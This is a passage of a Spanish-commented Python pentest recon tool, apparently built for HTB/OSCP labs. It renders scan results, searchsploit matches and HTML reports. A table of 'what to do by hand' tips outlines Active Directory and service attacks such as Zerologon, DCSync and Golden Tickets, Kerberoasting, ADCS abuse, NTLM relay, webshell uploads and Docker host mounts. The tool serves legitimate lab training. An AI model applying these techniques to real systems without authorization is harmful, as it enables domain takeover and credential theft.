    plataforma no soporta chown)."""
    uid = os.environ.get("SUDO_UID")
    if not (uid and hasattr(os, "chown")):
        return None
    return int(uid), int(os.environ.get("SUDO_GID") or uid)


def _chown_real(path, ids=None):
    """Da la propiedad de UN path al usuario real (si corremos con sudo). Silencioso."""
    ids = ids or _real_user_ids()
    if not ids:
        return
    try:
        os.chown(path, ids[0], ids[1])
    except OSError:
        pass


def _real_home(ids):
    try:
        import pwd
        return Path(pwd.getpwuid(ids[0]).pw_dir)
    except (KeyError, ImportError):
        return None


def chown_dirs(base):
    """Bajo sudo, da la propiedad de las CARPETAS de resultados al usuario real nada más
    crearlas (outdir padre, <ip>/, nmap/, web/). Así, aunque el escaneo se interrumpa
    antes del chown final, el usuario puede borrar/leer su contenido SIN sudo: en Unix
    borrar un fichero depende de los permisos del DIRECTORIO, no del propio fichero."""
    ids = _real_user_ids()
    if not ids:
        return
    home = _real_home(ids)
    dirs = [base / "nmap", base / "web", base]
    parent = base.parent
    if parent != parent.parent and parent != home:   # el outdir (~/htb); nunca '/' ni el home
        dirs.append(parent)
    for d in dirs:
        _chown_real(d, ids)


def chown_results(base):
    """Al terminar con sudo, remata devolviendo al usuario real los FICHEROS que escribió
    root (nmap, logs, informes) — las carpetas ya se le dieron al crearlas (chown_dirs).
    Incluye el outdir padre (~/htb) para que un run posterior sin sudo pueda crear
    subcarpetas dentro."""
    ids = _real_user_ids()
    if not ids:
        return
    home = _real_home(ids)
    targets = list(base.rglob("*")) + [base]
    parent = base.parent
    if parent != parent.parent and parent != home:
        targets.append(parent)
    for p in targets:
        _chown_real(p, ids)


# ───────────────────────── Salida en pantalla ─────────────────────────
def render(ip, ports, host):
    print()
    print(f"{C_BOLD}══ {ip} ══{C_RESET}")
    print(f"{C_BOLD}{'PUERTO':<11}{'ESTADO':<14}{'SERVICIO':<16}{'VERSIÓN':<34}BANNER{C_RESET}")
    for p in sorted(ports, key=lambda x: (x["proto"], x["port"])):
        ver = sanitize(version_str(p))
        banner = sanitize(p.get("banner", ""))
        unknown = not p["name"] or p["name"] in ("unknown", "tcpwrapped") or not ver
        col = C_YELLOW if unknown else C_GREEN
        pp = f"{p['port']}/{p['proto']}"
        print(f"{col}{pp:<11}{C_RESET}{p['state']:<14}{sanitize(p['name'] or '?'):<16}"
              f"{ver[:33]:<34}{C_GREY}{banner}{C_RESET}")
        for sid, out in p["scripts"].items():
            _print_script(sid, out)
    if host:
        print(f"\n{C_BOLD}── scripts de host ──{C_RESET}")
        for sid, out in host.items():
            _print_script(sid, out)
    print()


def _print_script(sid, out):
    if not out:
        return
    lines = sanitize(out).splitlines()
    print(f"    {C_BLUE}|{C_RESET} {C_BOLD}{sid}{C_RESET}: {lines[0]}")
    for extra in lines[1:8]:
        print(f"    {C_BLUE}|{C_RESET}   {extra.strip()}")


def render_footprint(footprints):
    """Resumen en pantalla del footprinting: por protocolo, con los comandos
    (✓/✗) y los hallazgos resaltados. El detalle completo va al HTML."""
    if not footprints:
        return
    print(f"{C_BOLD}══ Footprinting por protocolo ══{C_RESET}")
    for fpr in footprints:
        pstr = ",".join(map(str, fpr["ports"]))
        tag = f" {C_GREY}({pstr}){C_RESET}" if pstr else ""   # ports=[]: footprint ligado al
        print(f"\n  {C_BOLD}{C_CYAN}▸ {fpr['title']}{C_RESET}{tag}")   # dominio (whois/ctlogs/…), sin '()' colgando
        for st in fpr["steps"]:
            mark = f"{C_GREEN}✓{C_RESET}" if st["ok"] else f"{C_GREY}·{C_RESET}"
            print(f"    {mark} {C_GREY}$ {st['cmd']}{C_RESET}")
            if st.get("note"):                        # modo educativo: el porqué de cada comando
                print(f"      {C_GREY}↳ por qué: {st['note']}{C_RESET}")
        for sev, txt in sorted(fpr["findings"], key=lambda f: SEV_ORDER.get(f[0], 9)):
            col = {"critica": C_RED + C_BOLD, "alta": C_RED, "media": C_YELLOW, "info": C_BLUE}.get(sev, C_GREY)
            print(f"      {col}★ [{sev}]{C_RESET} {txt}")
        if fpr["missing"]:
            print(f"      {C_GREY}(sin instalar: {', '.join(fpr['missing'])}){C_RESET}")
    print()


# ── Tips educativos: "qué hacer A MANO" por categoría de hallazgo — pedido explícito para
# uso en el examen OSCP, donde la explotación automatizada no está permitida. SOLO texto:
# no ejecutan nada ni cambian qué se escanea. No tocan la forma de los findings (sigue
# siendo (severidad, texto) en las ~cientos de .append() del fichero) — se adjuntan por
# COINCIDENCIA contra ese texto ya existente, en la capa de presentación (quick_wins →
# terminal/HTML/Markdown), nunca en la recolección. Lista abierta: ir ampliándola con el
# tiempo, no hace falta cubrir cada hallazgo posible de golpe (ver MEJORAS.md).
_TIPS = (
    (re.compile(r"AXFR permitido", re.I),
     "Un zone transfer da de golpe el mapa del dominio interno: hosts, subdominios y a veces "
     "un TXT con la flag directamente. Revisa el volcado crudo del paso 'dig axfr' antes de "
     "seguir con el resto del recon — puede ahorrarte el resto del enumerado."),
    (re.compile(r"Zerologon", re.I),
     "Confirmado VULNERABLE, no explotado: el siguiente paso (resetear la contraseña de "
     "máquina del DC) rompe su autenticación Kerberos al momento — pero NO es irreversible: "
     "la copia LOCAL de esa contraseña en el propio DC (secreto LSA $MACHINE.ACC) no se toca, "
     "así que tras el DCSync se puede recuperar en claro y restaurarla (restorepassword.py del "
     "mismo repo del exploit). Aun así, el DC queda con el canal seguro roto durante la ventana "
     "entre el reset y la restauración — piénsalo si el lab lo necesita sano para algo más "
     "mientras tanto."),
    (re.compile(r"noPac", re.I),
     "Confirmado VULNERABLE, no explotado: antes de lanzar noPac.py confirma el hostname "
     "EXACTO del DC (nbtstat/rdp-ntlm-info) — con el nombre equivocado el ataque falla sin "
     "margen de prueba-error silenciosa, a diferencia de probar una credencial."),
    (re.compile(r"DCSync permitido", re.I),
     "El hash de krbtgt es la llave maestra del dominio: con él se forjan tickets Kerberos "
     "válidos para CUALQUIER usuario (Golden Ticket) sin volver a tocar el DC. El volcado "
     "completo de NTDS es un paso manual aparte (secretsdump.py -just-dc) — en un entorno "
     "real sería de las acciones más ruidosas/persistentes de todo el pentest."),
    (re.compile(r"LAPS legible", re.I),
     "Esa contraseña de administrador local suele estar REUTILIZADA en varias máquinas si el "
     "despliegue de LAPS no es por equipo — pruébala contra otros hosts Windows del mismo "
     "scope, no solo contra el que la expuso."),
    (re.compile(r"GPP (cpassword|autolog)", re.I),
     "MS14-025 es viejo pero sigue apareciendo en labs: la contraseña ya viene descifrada en "
     "el hallazgo. Pruébala tal cual contra el usuario al que estaba asignada — a menudo una "
     "cuenta de servicio con más privilegios de los que su nombre sugiere."),
    (re.compile(r"AS-REP", re.I),
     "El hash AS-REP se crackea offline (hashcat -m 18200) sin volver a tocar el AD: cero "
     "riesgo de bloqueo de cuenta en el crackeo en sí. Si la wordlist por defecto no la rompe, "
     "prueba con reglas (best64/rockyou) antes de descartar la cuenta."),
    (re.compile(r"Kerberoast", re.I),
     "Igual que el AS-REP, el crackeo (hashcat -m 13100) es offline — pero aquí la contraseña "
     "de la cuenta de servicio sí importa: nadie las rota a mano tan a menudo como las de "
     "usuario. Prioriza las que suenen a privilegiadas (svc_/sql/backup/admin)."),
    (re.compile(r"plantilla\(s\) vulnerable", re.I),
     "ESC1/ESC2/ESC3 suelen ser los más directos (pedir un cert como Administrator); ESC8 "
     "necesita relay NTLM contra el propio servicio de inscripción web, un paso más. Antes de "
     "'certipy req', copia CA y plantilla EXACTOS de la salida de 'certipy find' — un nombre "
     "mal copiado falla en silencio."),
    (re.compile(r"share.*?(ESCRIBIBLE|WRITE)|export ESCRIBIBLE", re.I),
     "Escritura no es lo mismo que ejecución: comprueba si el share es accesible desde un path "
     "que algo REALMENTE ejecute (wwwroot, un cron, un script de login) antes de plantar nada — "
     "escribir donde nadie lee no lleva a ningún lado."),
    (re.compile(r"share.*?(legible|READ)\b", re.I),
     "Antes de spidear a ciegas, mira a mano qué hay en shares como NETLOGON/SYSVOL/Users — ahí "
     "suelen vivir scripts de login, GPO y perfiles con pistas que una ojeada manual encuentra "
     "más rápido que un spider genérico."),
    (re.compile(r"no_root_squash", re.I),
     "root_squash desactivado deja montar el export como tu propio root y escribir ficheros "
     "con el UID que quieras — lo clásico es copiar un binario SUID propiedad de root. Mira "
     "igual qué hay YA en el export: a veces hay más que ganar leyendo que escalando."),
    (re.compile(r"Pwn3d!"),
     "Admin confirmado no es lo mismo que shell: antes de ir a por RCE (wmiexec/psexec/winrm), "
     "mira qué credencial usaste — si es de dominio, pruébala también contra OTRAS máquinas "
     "antes de asumir que esta es la única puerta."),
    (re.compile(r"login anónimo permitido", re.I),
     "Antes de automatizar nada, navega el árbol a mano (ls -R si el servidor lo permite): es "
     "habitual encontrar backups, código fuente o credenciales sueltas en un FTP anónimo que "
     "nadie limpió desde que se montó."),
    (re.compile(r"m[ée]todo PUT permitido|WebDAV activo", re.I),
     "Antes de subir nada, comprueba con un PUT de prueba inocuo qué extensión ejecuta de "
     "verdad el servidor (.aspx/.php/.jsp) — una webshell con la extensión equivocada solo "
     "queda como fichero estático, sin ejecutarse."),
    (re.compile(r"Docker API.*SIN AUTENTICACI[OÓ]N", re.I),
     "El comando para montar el host ya viene en el siguiente paso: hazlo en un contenedor "
     "NUEVO, no reutilices uno que ya esté corriendo (podrías pisar un servicio que el propio "
     "lab necesita)."),
    (re.compile(r"MS-(RPRN|PAR|EFSR)"),
     "La coacción (PetitPotam/PrinterBug) por sí sola no hace nada: necesitas algo escuchando "
     "(ntlmrelayx.py, o 'certipy relay' si el destino es la CA) en el otro extremo ANTES de "
     "dispararla, normalmente apuntando a LDAP(S) o a AD CS (ESC8) para sacar un "
     "ticket/certificado de la máquina coaccionada. 'coercer' prueba varios métodos MS-EFSR/"
     "MS-RPRN por ti y ha sustituido en la práctica usar PetitPotam.py/PrinterBug.py sueltos. Si "
     "lo expuesto es el spooler (MS-RPRN/MS-PAR), ojo: PrintNightmare NO necesita coacción, es "
     "RCE directo — pero solo con el fork de impacket de cube0x0 (el oficial no lo trae) y solo "
     "si el objetivo no tiene el hardening de Point and Print, de serie en builds parcheadas "
     "desde 2021 (sigue siendo habitual en labs con imágenes antiguas)."),
    (re.compile(r"(Redis|MongoDB|Memcached).*SIN autenticaci[oó]n", re.I),
     "Sin autenticación casi siempre es lectura Y escritura: en Redis en concreto, mira si "
     "puedes escribir una clave que el propio servicio luego cargue (cron vía módulo/RDB) "
     "antes de descartarlo como 'solo lectura'."),
    (re.compile(r"community.*v[áa]lida|community por defecto", re.I),
     "Una community SNMP legible suele filtrar más de lo que parece: procesos en ejecución (a "
     "veces con contraseñas en los argumentos), interfaces de red, y en routers/switches a "
     "veces hasta el propio community de ESCRITURA."),
    (re.compile(r"acceso (remoto )?gr[áa]fico SIN autenticaci[oó]n", re.I),
     "Es acceso directo a la sesión gráfica activa de un usuario — mira qué hay abierto en "
     "pantalla antes de tocar nada; a veces la propia sesión ya tiene credenciales a la vista."),
    (re.compile(r"\.git/ expuesto", re.I),
     "Clona el repo entero (no solo HEAD) y revisa el historial completo, no solo el commit "
     "actual — es habitual que una credencial o clave se borrara en un commit posterior pero "
     "siga viva en el historial."),
)


def _tip_for(finding_text):
    """Primer tip cuyo patrón casa con el texto de un hallazgo, o None si ninguno aplica.
    Puro → testable sin red. Guía textual para que el operador decida el siguiente paso A
    MANO (nunca se ejecuta nada) — pensado también para examen OSCP, donde la explotación
    automatizada no está permitida."""
    for pat, tip in _TIPS:
        if pat.search(finding_text):
            return tip
    return None


# CVE / nombre de ataque "fuerte": si el hallazgo Y un next-step del MISMO footprint mencionan
# el mismo término de esta lista, ese next-step es casi con toda seguridad el paso que explota
# ESE hallazgo en concreto, no uno cualquiera de los próximos pasos del footprint — ver _cmds_for.
_STRONG_KW_RE = re.compile(
    r"CVE-\d{4}-\d{4,}|MS\d{2}-\d{3}|Zerologon|noPac|PrinterBug|PetitPotam|DCSync|"
    r"Kerberoast|AS-REP|LAPS|GPP|EternalBlue|AXFR|no_root_squash|SWEET32|BlueKeep", re.I)


def _cmds_for(finding_text, next_steps, n=3):
    """Comandos de 'next' más RELEVANTES para ESTE hallazgo, no solo "los primeros N del
    footprint entero": un footprint (p. ej. fp_smb en un DC) acumula next-steps de VARIOS
    hallazgos distintos en orden de EJECUCIÓN, no de relevancia — antes quick_wins() enseñaba
    el mismo primer-N a TODOS los hallazgos críticos/altos de ese footprint. Bug real: en un DC,
    fp_smb añade 'rpcclient: queryuser <RID>' (RID cycling, sin relación) ANTES que el
    git-clone+zerologon_tester.py del hallazgo de Zerologon, así que el quick win de Zerologon
    enseñaba el RID cycling como 1er comando y el exploit de verdad como 2º (o ni eso, si el
    footprint tenía más de 3 next-steps por delante). Prioriza los next-steps que comparten con
    el hallazgo un CVE o nombre de ataque "fuerte" (_STRONG_KW_RE); si ninguno casa, cae al
    orden original (compatibilidad con los hallazgos genéricos, que son la mayoría — no llevan
    un next-step dedicado y seguir sacando los primeros N sigue siendo lo correcto). Puro →
    testeable sin red."""
    kws = {m.group(0).lower() for m in _STRONG_KW_RE.finditer(finding_text)}
    if kws:
        matched = [c for c in next_steps if any(k in c.lower() for k in kws)]
        if matched:
            rest = [c for c in next_steps if c not in matched]
            return (matched + rest)[:n]
    return list(next_steps[:n])


def quick_wins(footprints, vulns=None):
    """De todos los footprints extrae lo más accionable (hallazgos críticos/altos) y
    le asocia los comandos concretos del propio protocolo para explotarlo. Si se pasa
    `vulns` (de vuln_search), también saca ahí las filas known=True — un producto
    identificado por KNOWN_VULN_WEB_PRODUCTS es crítico aunque el searchsploit local
    no tenga copia del exploit (no depende de que exploit-db esté actualizado).
    Alimenta la caja de 'quick wins' de pantalla, HTML y Markdown."""
    wins = []
    for fpr in footprints:
        hot = [(s, t) for s, t in fpr["findings"] if s in ("critica", "alta")]
        if not hot:
            continue
        for s, t in hot:
            wins.append({"sev": s, "title": t, "cmds": _cmds_for(t, fpr["next"]), "tip": _tip_for(t)})
    for v in (vulns or []):
        if not v.get("known"):
            continue
        if v["exploits"]:
            cmds = [f"searchsploit -x {v['exploits'][0]['edb']}   # ver/copiar el PoC local"]
        else:
            cmds = [f"searchsploit {v['term']}   # buscar el módulo/PoC a mano"]
        wins.append({"sev": "critica",
                     "title": f"{v['product']} en puerto {v['ports'][0]}: {v['known_note']}",
                     "cmds": cmds})
    wins.sort(key=lambda w: SEV_ORDER.get(w["sev"], 9))
    # Dedup DESPUÉS de ordenar: un MISMO next-step se muestra una sola vez, en el win de MAYOR
    # severidad (p. ej. el bloodhound de la Fase 5d, común a varios hallazgos) — así la caja de
    # quick wins no repite el mismo comando 6-7 veces seguidas.
    seen_cmds = set()
    for w in wins:
        w["cmds"] = [c for c in w["cmds"] if not (c in seen_cmds or seen_cmds.add(c))]
    return wins


def render_quick_wins(wins):
    if not wins:
        return
    lines = []
    for w in wins[:12]:
        col = C_RED + C_BOLD if w["sev"] == "critica" else C_RED
        lines.append(f"{col}[{w['sev']}]{C_RESET} {w['title']}")
        for c in w["cmds"][:2]:
            lines.append(f"  {C_GREY}$ {c}{C_RESET}")
        if w.get("tip"):
            lines.append(f"  {C_GREY}↳ qué hacer: {w['tip']}{C_RESET}")
    if len(wins) > 12:
        lines.append(f"{C_GREY}… y {len(wins) - 12} más (ver informe).{C_RESET}")
    box(lines, title=f"★ QUICK WINS ({len(wins)}) — por dónde empezar",
        color=C_RED, style="double", wrap=True)
    print()


def _fmt_elapsed(seconds):
    """Segundos → 'Xh Ym Zs' compacto (omite por la izquierda las unidades a cero).
    Puro → testable sin red."""
    s = max(0, int(round(seconds)))
    h, rem = divmod(s, 3600)
    m, sec = divmod(rem, 60)
    parts = []
    if h:
        parts.append(f"{h}h")
    if m or h:
        parts.append(f"{m}m")
    parts.append(f"{sec}s")
    return " ".join(parts)


def print_run_summary(ip, name, base, services, host, footprints, vulns, elapsed):
    """Resumen final de UN objetivo, impreso SIEMPRE al terminar run_one: lo esencial de un
    vistazo (tiempo, puertos, protocolos, hallazgos por severidad, el mejor 'por dónde
    empezar' y la ruta del informe). Tras un escaneo largo evita rebuscar hacia arriba en la
    terminal — es el '¿y ahora qué?' resuelto en pocas líneas."""
    findings = _all_findings(services, host, footprints, vulns)
    counts = {}
    for sev, _ in findings:
        counts[sev] = counts.get(sev, 0) + 1
    n_protos = len(_group_footprints_by_protocol(footprints))
    n_ports = len([p for p in services if _confirmed_open(p)])
    label = ip + (f" ({name})" if name else "")
    lines = [f"{C_GREY}Duración:{C_RESET} {_fmt_elapsed(elapsed)}   ·   "
             f"{C_BOLD}{n_ports}{C_RESET} puerto(s)   ·   "
             f"{C_BOLD}{n_protos}{C_RESET} protocolo(s) footprinted"]
    sev_disp = [("critica", C_RED + C_BOLD, "críticas"), ("alta", C_RED, "altas"),
                ("media", C_YELLOW, "medias"), ("info", C_BLUE, "info"), ("baja", C_GREY, "bajas")]
    chunks = [f"{col}{counts[k]} {lbl}{C_RESET}" for k, col, lbl in sev_disp if counts.get(k)]
    lines.append("Hallazgos: " + (" · ".join(chunks) if chunks else f"{C_GREY}ninguno destacado{C_RESET}"))
    wins = quick_wins(footprints, vulns)
    if wins:
        w = wins[0]
        col = C_RED + C_BOLD if w["sev"] == "critica" else C_RED
        lines.append(f"{C_YELLOW}★ Empieza por:{C_RESET} {col}[{w['sev']}]{C_RESET} {w['title']}")
        if w["cmds"]:
            lines.append(f"  {C_GREY}$ {w['cmds'][0]}{C_RESET}")
        if w.get("tip"):
            lines.append(f"  {C_GREY}↳ qué hacer: {w['tip']}{C_RESET}")
    report = base / "report.html"
    if report.is_file():
        lines.append(f"{C_GREY}📄 Informe:{C_RESET} {C_BLUE}{report}{C_RESET}")
    else:
        lines.append(f"{C_GREY}📄 Resultados:{C_RESET} {C_BLUE}{base}{C_RESET}")
    print()
    box(lines, title=f"RESUMEN · {label}", color=C_YELLOW, style="grad", wrap=True)
    print()


def render_vulns(vulns):
    if vulns is None:
        warn("searchsploit no está instalado: me salto la búsqueda de exploits.")
        return
    rows = [v for v in vulns if v["exploits"]]
    print(f"{C_BOLD}══ Exploits conocidos (searchsploit) ══{C_RESET}")
    if not rows:
        info("searchsploit: sin coincidencias para las versiones detectadas.")
        print(); return
    sevcol = {"critica": C_RED, "alta": C_YELLOW, "media": C_BLUE, "baja": C_GREY}
    # servicios con el exploit más crítico primero
    rows.sort(key=lambda v: min(EXPLOIT_SEV_ORDER.get(e["sev"], 9) for e in v["exploits"]))
    for v in rows:
        pstr = ",".join(map(str, v["ports"]))
        exps = sorted(v["exploits"], key=lambda e: EXPLOIT_SEV_ORDER.get(e["sev"], 9))
        print(f"\n  {C_BOLD}{C_CYAN}▸ {v['product']} {v['version']}{C_RESET} "
              f"{C_GREY}({pstr}) · término: {v['term']}{C_RESET}")
        for e in exps[:12]:
            col = sevcol.get(e["sev"], C_GREY)
            print(f"    {col}[{e['sev']:<7}]{C_RESET} {C_RED}EDB-{e['edb']}{C_RESET}  "
                  f"{sanitize(e['title'])}  {C_GREY}[{e['platform']}]{C_RESET}")
        if len(exps) > 12:
            print(f"    {C_GREY}… y {len(exps)-12} más (ver report.html){C_RESET}")
    print(f"\n  {C_GREY}Criticidad = estimación por tipo/título (no es CVSS). Verifica cada uno "
          f"con  searchsploit -x EDB-ID  antes de usarlo.{C_RESET}\n")


# ───────────────────────── Wordlists ─────────────────────────
def pick_wordlists(user_wls, profile, add_always=True):
    if user_wls:
        wls = []
        for w in user_wls:
            if Path(w).is_file():
                wls.append(w)
            else:
                warn(f"wordlist no encontrada, la ignoro: {w}")
    else:
        wls = [w for w in WORDLIST_PROFILES.get(profile, []) if Path(w).is_file()]
    if not wls and Path(WORDLIST_FALLBACK).is_file():
        wls = [WORDLIST_FALLBACK]
    if add_always and Path(WORDLIST_ALWAYS).is_file() and WORDLIST_ALWAYS not in wls:
        wls.append(WORDLIST_ALWAYS)
    return wls


def _target_is_windows(services, host):
    """Heurística: ¿el objetivo es Windows? En Windows el filesystem/URLs son
    case-INSENSITIVE → en el fuzzing web conviene la wordlist `-lowercase` (misma
    cobertura: cualquier variante de caso en disco la encuentra igual, pero sin sacar
    N duplicados por mayúsculas —test.php/Test.php/TEST.php— y con menos líneas). En
    Linux NO (case-sensitive: 'Admin' ≠ 'admin'). Señales: smb-os-discovery, RDP
    (3389/ms-wbt-server/scripts rdp-*), o Windows/Win32/Win64/Microsoft/IIS en el
    producto/versión/banner. Puro → testable sin red."""
    if "windows" in (host.get("smb-os-discovery", "") or "").lower():
        return True
    pat = re.compile(r"windows|win32|win64|microsoft|\biis\b", re.I)
    for p in services:
        if p.get("name") == "ms-wbt-server" or p.get("port") == 3389:
            return True
        if any(str(k).startswith("rdp-") for k in (p.get("scripts") or {})):
            return True
        blob = " ".join(str(p.get(k, "")) for k in ("product", "version", "extrainfo", "banner"))
        if pat.search(blob):
            return True
    return False


def _lowercase_wordlists(wls):
    """Mapea cada wordlist a su variante `-lowercase` si existe (p. ej.
    raft-medium-directories.txt → raft-medium-directories-lowercase.txt). Las que no la
    tengan (big.txt…) se dejan igual. Solo se aplica en objetivos Windows (ver
    _target_is_windows). Testable con un directorio temporal."""
    out = []
    for w in wls:
        p = Path(w)
        lc = p.with_name(p.stem + "-lowercase" + p.suffix)
        out.append(str(lc) if lc.is_file() else w)
    return out


def norm_ext(ext):
    if not ext:
        return ""
    return ",".join("." + e.strip().lstrip(".") for e in ext.split(",") if e.strip())


# ───────────────────────── Informe HTML ─────────────────────────
HTML_CSS = """
:root{--bg:#0b0d0f;--panel:#12161a;--panel2:#161b21;--fg:#d9e0e6;--muted:#8b98a5;
--amber:#ffb000;--amber2:#ffd166;--green:#3fb950;--red:#f85149;--yel:#d29922;
--blue:#58a6ff;--border:#242c35}
*{box-sizing:border-box}
html{scroll-behavior:smooth}
body{margin:0;background:var(--bg);color:var(--fg);
font:14px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
a{color:var(--blue);text-decoration:none}a:hover{text-decoration:underline}
header{position:sticky;top:0;z-index:9;padding:14px 22px;
background:linear-gradient(180deg,#0b0d0f 70%,#0b0d0fcc);
border-bottom:1px solid var(--border);backdrop-filter:blur(6px)}
header h1{margin:0;font-size:18px;color:var(--amber);letter-spacing:.5px}
header h1 span{color:var(--muted);font-weight:400}
.sub{color:var(--muted);font-size:12px;margin-top:3px}
.wrap{max-width:1100px;margin:0 auto;padding:22px}
.cards{display:flex;flex-wrap:wrap;gap:12px;margin:0 0 20px}
.card{flex:1 1 150px;background:var(--panel);border:1px solid var(--border);
border-radius:10px;padding:14px 16px}
.card .n{font-size:26px;font-weight:700;color:var(--amber)}
.card .l{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.5px}
.toolbar{display:flex;gap:10px;align-items:center;margin:0 0 16px;flex-wrap:wrap}
.toolbar input{flex:1;min-width:200px;background:var(--panel);border:1px solid var(--border);
color:var(--fg);border-radius:8px;padding:8px 12px;font:inherit}
.btn{background:var(--panel2);border:1px solid var(--border);color:var(--fg);
border-radius:8px;padding:8px 12px;cursor:pointer;font:inherit}
.btn:hover{border-color:var(--amber)}
.sevbar{display:flex;gap:8px;flex-wrap:wrap;margin:2px 0 14px}
.findings{background:var(--panel);border:1px solid var(--border);border-radius:10px;
padding:6px 0;margin:0 0 20px}
.f{display:flex;gap:10px;align-items:baseline;padding:7px 16px;border-top:1px solid var(--border)}
.f:first-child{border-top:none}
.badge{font-size:11px;font-weight:700;padding:2px 8px;border-radius:999px;white-space:nowrap}
.critica{background:#4a0f12;color:#ff6b6b;border:1px solid #7a1419;font-weight:800}
.alta{background:#3d1416;color:var(--red);border:1px solid #5c1a1d}
.media{background:#3a2d0a;color:var(--yel);border:1px solid #5c470f}
.info{background:#0d2a44;color:var(--blue);border:1px solid #11395c}
.baja{background:#20262d;color:var(--muted);border:1px solid var(--border)}
details{background:var(--panel);border:1px solid var(--border);border-radius:10px;
margin:0 0 12px;overflow:hidden}
details[open]{box-shadow:0 0 0 1px var(--border)}
summary{cursor:pointer;padding:13px 18px;font-weight:600;list-style:none;
display:flex;align-items:center;gap:10px;user-select:none}
summary::-webkit-details-marker{display:none}
summary::before{content:"\\25B8";color:var(--amber);transition:transform .15s}
details[open] summary::before{transform:rotate(90deg)}
summary .tag{color:var(--muted);font-weight:400;font-size:12px}
summary .pill{margin-left:auto;font-size:11px;color:var(--muted);
border:1px solid var(--border);border-radius:999px;padding:1px 9px}
.body{padding:4px 18px 16px}
h3{color:var(--amber2);font-size:13px;margin:16px 0 6px;letter-spacing:.3px}
.subhead{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.6px;
margin:18px 0 8px;padding-top:14px;border-top:1px dashed var(--border)}
.subhead:first-child{margin-top:4px;padding-top:0;border-top:none}
details.attempts{background:var(--panel2);margin:10px 0;border-radius:8px;box-shadow:none}
details.attempts summary{padding:9px 14px;font-weight:400;font-size:12.5px;color:var(--muted)}
details.attempts summary::before{color:var(--muted)}
details.attempts .body{padding:2px 14px 10px}
.cmd{color:var(--muted);font-size:12px;margin:12px 0 4px;word-break:break-all}
.cmd .ok{color:var(--green)}.cmd .no{color:var(--muted)}
.tip{color:var(--muted);font-size:12.5px;font-style:italic;margin:6px 0 2px;line-height:1.5}
pre{background:#0a0c0e;border:1px solid var(--border);border-radius:8px;
padding:12px 14px;overflow-x:auto;font-size:12.5px;line-height:1.5;margin:0;
white-space:pre-wrap;overflow-wrap:anywhere;word-break:normal}
.next{color:var(--amber2)}
.next li{margin:3px 0}
.why{color:var(--muted);font-size:12px;margin:0 0 8px;padding-left:16px;border-left:2px solid var(--border)}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:7px 10px;border-bottom:1px solid var(--border);vertical-align:top}
th{color:var(--muted);text-transform:uppercase;font-size:11px;letter-spacing:.5px}
td.p{color:var(--amber);font-weight:600;white-space:nowrap}
.svc-open{color:var(--green)}.svc-unk{color:var(--yel)}
.miss{color:var(--muted);font-size:12px;font-style:italic}
footer{color:var(--muted);font-size:12px;text-align:center;padding:30px 0 40px}
code{background:#0a0c0e;border:1px solid var(--border);border-radius:5px;padding:1px 5px}
.hostbar{color:var(--muted);font-size:12px;margin:0 0 20px}
.hostbar code{color:var(--amber2)}
.prelim{display:flex;gap:10px;align-items:baseline;background:#2a1f05;
border:1px solid #5c470f;color:var(--amber2);border-radius:10px;
padding:11px 15px;margin:0 0 18px;font-size:12.5px}
.prelim .spin{animation:pal-spin 1.2s linear infinite;display:inline-block}
@keyframes pal-spin{to{transform:rotate(360deg)}}
.toc{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin:0 0 16px}
.toc .lbl{color:var(--muted);font-size:12px;margin-right:2px}
.toc a{display:inline-flex;align-items:center;gap:6px;background:var(--panel);
border:1px solid var(--border);border-radius:999px;padding:3px 11px;font-size:12px;
color:var(--fg)}
.toc a:hover{border-color:var(--amber);text-decoration:none}
.toc a .n{background:var(--panel2);color:var(--muted);border-radius:999px;
padding:0 7px;font-size:11px}
.copy{margin-left:8px;padding:0 7px;font:inherit;font-size:11px;line-height:1.7;
color:var(--muted);background:var(--panel2);border:1px solid var(--border);
border-radius:6px;cursor:pointer;vertical-align:middle}
.copy:hover{border-color:var(--amber);color:var(--amber2)}
.copy.ok{color:var(--green);border-color:var(--green)}
.next li .copy{margin-left:6px}
"""

HTML_JS = """
const q=document.getElementById('filter');
if(q){q.addEventListener('input',()=>{const v=q.value.toLowerCase();
document.querySelectorAll('details.proto').forEach(d=>{
d.style.display=d.innerText.toLowerCase().includes(v)?'':'none';});});}
document.getElementById('expand').onclick=()=>document.querySelectorAll('details').forEach(d=>d.open=true);
document.getElementById('collapse').onclick=()=>document.querySelectorAll('details').forEach(d=>d.open=false);
// Índice: abre el <details> destino (y sus ancestros) antes de hacer scroll.
function palOpen(id){const el=document.getElementById(id);if(!el)return;
let n=el;while(n){if(n.tagName==='DETAILS'){n.open=true;}n=n.parentElement;}
el.scrollIntoView({behavior:'smooth',block:'start'});}
document.querySelectorAll('nav.toc a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{
e.preventDefault();const id=a.getAttribute('href').slice(1);palOpen(id);
try{history.replaceState(null,'','#'+id);}catch(_){}});});
if(location.hash.length>1){palOpen(location.hash.slice(1));}
// Copiar comando al portapapeles (con fallback para file:// sin navigator.clipboard).
function palCopy(t,done){if(navigator.clipboard&&navigator.clipboard.writeText){
navigator.clipboard.writeText(t).then(done,()=>palCopyFb(t,done));}else{palCopyFb(t,done);}}
function palCopyFb(t,done){try{const ta=document.createElement('textarea');ta.value=t;
ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.focus();ta.select();
document.execCommand('copy');document.body.removeChild(ta);done();}catch(_){}}
document.querySelectorAll('button.copy').forEach(b=>{b.addEventListener('click',()=>{
palCopy(b.dataset.cmd||'',()=>{const o=b.textContent;b.textContent='✓';b.classList.add('ok');
setTimeout(()=>{b.textContent=o;b.classList.remove('ok');},1200);});});});
"""


def _h(s):
    return html.escape(str(s))


def _copy_btn(cmd):
    """Botón ⧉ que copia `cmd` al portapapeles (el texto va en data-cmd, escapado para
    el atributo; el JS del informe lo lee). Así no hay que seleccionar a mano comandos
    largos (enum4linux, nxc con credenciales…) para pegarlos en la terminal."""
    return f'<button class="copy" type="button" data-cmd="{_h(cmd)}" title="copiar comando">⧉</button>'


def _html_findings_block(findings):
    if not findings:
        return ""
    rows = []
    for sev, txt in sorted(findings, key=lambda f: SEV_ORDER.get(f[0], 9)):
        rows.append(f'<div class="f"><span class="badge {sev}">{sev.upper()}</span>'
                    f'<span>{_h(txt)}</span></div>')
    return '<div class="findings">' + "".join(rows) + "</div>"


def _html_steps_raw(steps):
    out = []
    for st in steps:
